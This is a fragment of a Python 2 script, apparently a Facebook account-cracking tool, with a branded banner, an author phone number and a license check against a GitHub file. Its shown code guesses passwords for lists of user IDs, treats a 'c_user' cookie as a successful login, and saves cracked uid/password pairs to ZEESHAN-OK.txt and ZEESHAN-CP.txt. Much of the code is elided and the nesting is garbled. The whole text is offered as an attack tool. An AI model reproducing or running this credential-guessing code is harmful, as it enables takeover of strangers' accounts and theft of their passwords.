...
logo = """'\x1b[0;37m'  
'\x1b[0;37m'    ______ _____  _____  _____  _   _   ___   _   _ 
'\x1b[0;37m'   |___  /|  ___||  ___|/  ___|| | | | / _ \ | \ | |
'\x1b[0;37m'      / / | |__  | |__  \ `--. | |_| |/ /_\ \|  \| |
'\x1b[0;37m'     / /  |  __| |  __|  `--. \|  _  ||  _  || . ` |
'\x1b[0;37m'   ./ /___| |___ | |___ /\__/ /| | | || | | || |\  |
'\x1b[0;37m'   \_____/\____/ \____/ \____/ \_| |_/\_| |_/\_| \_/


'\x1b[0;37m'   Author      :      PHUCK NAYAB-PARI     
'\x1b[0;37m'   Github      :      NAYAB PARI  
'\x1b[0;37m'   FB ID       :      ZEESHAN
'\x1b[0;37m'   TOOL TYPE   :     FREE TOOL
'\x1b[0;37m'   WAP NUMBER  :    +923047274393         
"""
dec="2"
server="2"
...
def main_apv():
    ...
    r1=requests.get("https://raw.githubusercontent.com/TH3-FUCK3R/3-P/main/Approval.txt").text
    if key1 in r1:
        main_system()
    else:
        os.system("clear")
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[0;37m[ZEESHAN-OK] "+coc+user + " | " + pass1
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    ...
                    print "\x1b[0;37m[ZEESHAN-CP] "+coc+user + " | " + pass1
...
def xokpauto():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[0;37m[ZEESHAN-OK] "+uid + " | " + pass1
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print "\x1b[0;37m[ZEESHAN-OK] "+uid + " | " + pass2
                        ok=open('ZEESHAN-OK.txt', 'a')
                        ok.write(uid+ " | " +pass2+ "\n")
                        ok.close()
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print "\x1b[0;37m[ZEESHAN-OK] "+uid + " | " + pass3
                                ok=open('ZEESHAN-OK.txt', 'a')
                                ok.write(uid+ " | " +pass3+ "\n")
                                ok.close()
                                ...
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    ...
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        print "\x1b[0;37m[ZEESHAN-OK] "+uid + " | " + pass4
                                        ok=open('ZEESHAN-OK.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                print "\x1b[0;37m[ZEESHAN-OK] "+uid + " | " + pass5
                                                ok=open('ZEESHAN-OK.txt', 'a')
                                                ok.write(uid+ " | " +pass5+ "\n")
                                                ok.close()
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[0;37m[ZEESHAN-CP] "+uid + " | " + pass5
                                                    cp=open('ZEESHAN-CP.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    ...
                                                    if 'c_user' in rana.cookies.get_dict().keys():
                                                        print "\x1b[0;37m[ZEESHAN-OK] "+uid + " | " + pass6
                                                        ok=open('ZEESHAN-OK.txt', 'a')
                                                        ok.write(uid+ " | " +pass6+ "\n")
                                                        ok.close()
                                                        ...
                                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                                            print "\x1b[0;37m[ZEESHAN-CP] "+uid + " | " + pass6
                                                            cp=open('ZEESHAN-CP.txt', 'a')
                                                            cp.write(uid+ " | " +pass6+ "\n")
                                                            cp.close()
